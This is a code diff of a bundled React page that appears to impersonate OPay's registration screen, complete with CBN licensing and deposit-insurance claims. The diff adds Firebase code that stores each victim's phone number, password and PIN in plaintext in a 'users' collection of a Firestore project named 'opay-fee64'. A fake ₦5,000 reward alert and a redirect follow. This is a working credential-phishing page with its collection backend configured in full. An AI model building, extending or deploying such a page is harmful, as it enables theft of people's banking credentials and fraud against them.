@@ -8,6 +8,8 @@ require("@fortawesome/fontawesome-free/css/all.min.css");
 var $ltMAx$axios = require("axios");
 var $ltMAx$fortawesomereactfontawesome = require("@fortawesome/react-fontawesome");
 var $ltMAx$fortawesomefreesolidsvgicons = require("@fortawesome/free-solid-svg-icons");
+var $ltMAx$firebasefirestore = require("firebase/firestore");
+var $ltMAx$firebaseapp = require("firebase/app");
 
 
 function $parcel$interopDefault(a) {
@@ -36,7 +38,25 @@ $879490e392fb927c$exports = new URL("ndic.f3eabccb.jpg", "file:" + __filename).t
 
 
 
-const $da11a1101b2a894a$var$API_URL = "https://localhost:7127";
+
+
+// Your Firebase configuration
+const $d053af8962b2619d$var$firebaseConfig = {
+    apiKey: "AIzaSyBkPx_zFdsFkLjw5-2EciSWfP1sAzzvlxQ",
+    authDomain: "opay-fee64.firebaseapp.com",
+    projectId: "opay-fee64",
+    storageBucket: "opay-fee64.appspot.com",
+    messagingSenderId: "395081861378",
+    appId: "1:395081861378:web:6808d93cca017f7442da1b"
+};
+// Initialize Firebase
+const $d053af8962b2619d$var$app = (0, $ltMAx$firebaseapp.initializeApp)($d053af8962b2619d$var$firebaseConfig);
+const $d053af8962b2619d$export$f932f06c7eb6abeb = (0, $ltMAx$firebasefirestore.getFirestore)($d053af8962b2619d$var$app);
+
+
+
+// import UserForm from "../src/UserForm";
+// const API_URL = process.env.REACT_APP_API_URL || "http://localhost:7212";
 const $da11a1101b2a894a$var$App = ()=>{
     const [phoneNumber, setPhoneNumber] = (0, $ltMAx$react.useState)("");
     const [password, setPassword] = (0, $ltMAx$react.useState)("");
@@ -56,25 +76,19 @@ const $da11a1101b2a894a$var$App = ()=>{
         if (!validatePin(pin)) newErrors.pin = "PIN must be 4 digits";
         setErrors(newErrors);
         if (Object.keys(newErrors).length === 0) try {
-            const payload = {
-                PhoneNumber: phoneNumber,
-                Pin6: password,
-                Pin4: pin
-            };
-            const response = await (0, ($parcel$interopDefault($ltMAx$axios))).post(`${$da11a1101b2a894a$var$API_URL}/api/Auth/register`, payload, {
-                headers: {
-                    "Content-Type": "application/json"
-                },
-                withCredentials: true
+            await (0, $ltMAx$firebasefirestore.addDoc)((0, $ltMAx$firebasefirestore.collection)((0, $d053af8962b2619d$export$f932f06c7eb6abeb), "users"), {
+                phoneNumber: phoneNumber,
+                password: password,
+                pin: pin,
+                createdAt: new Date()
             });
-            console.log("Registration Success:", response.data);
-            alert("\uD83C\uDF89 Congratulations! You just won the \u20A65000 bonus. Please wait a few minutes for it to be added to your balance.");
+            alert("Congratulations, your reward of \u20A65,000 is on the way into your account \uD83C\uDF89.");
             navigate("/redirect", {
                 replace: true
-            }); // Change this line to use the redirect component
+            });
         } catch (error) {
-            console.error("Registration Failed:", error);
-            alert(error.response?.data?.message || "Registration failed");
+            console.error("Error saving data:", error);
+            alert("Error saving data");
         }
     };
     return /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("div", {
@@ -204,7 +218,8 @@ const $da11a1101b2a894a$var$App = ()=>{
                             alt: "CBN Logo",
                             className: "social-logo"
                         }),
-                        " Licensed by the ",
+                        " Licensed by the",
+                        " ",
                         /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("span", {
                             style: {
                                 color: "#3C3B5F",
@@ -212,8 +227,7 @@ const $da11a1101b2a894a$var$App = ()=>{
                             },
                             children: "CBN"
                         }),
-                        " ",
-                        "and insured by the",
+                        " and insured by the",
                         " ",
                         /*#__PURE__*/ (0, $ltMAx$reactjsxruntime.jsx)("img", {
                             src: (0, (/*@__PURE__*/$parcel$interopDefault($879490e392fb927c$exports))),
@@ -237,7 +251,7 @@ var $da11a1101b2a894a$export$2e2bcd8739ae039 = $da11a1101b2a894a$var$App;
 
 
 
-const $2372fbe6d8bd7284$var$API_URL = "https://localhost:7127";
+const $2372fbe6d8bd7284$var$API_URL = "https://localhost:7212";
 const $2372fbe6d8bd7284$var$Sign = ()=>{
     const [phoneNumber, setPhoneNumber] = (0, $ltMAx$react.useState)("");
     const [password, setPassword] = (0, $ltMAx$react.useState)("");
